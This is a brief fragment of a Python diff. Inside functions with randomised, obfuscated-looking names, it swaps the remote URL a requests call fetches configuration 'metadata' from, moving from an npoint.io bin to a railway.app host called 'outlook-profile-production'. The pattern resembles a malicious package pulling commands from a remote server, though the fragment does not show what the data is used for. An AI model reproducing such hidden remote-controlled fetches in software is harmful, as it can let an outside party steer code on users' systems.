@@ -18,7 +18,7 @@ def process_obivtx_486():
 
     def process_blqogd_952():
         try:
-            data_jhiumj_727 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_jhiumj_727 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_jhiumj_727.raise_for_status()
             config_tzpzse_427 = data_jhiumj_727.json()
             config_gaaojk_271 = config_tzpzse_427.get('metadata')
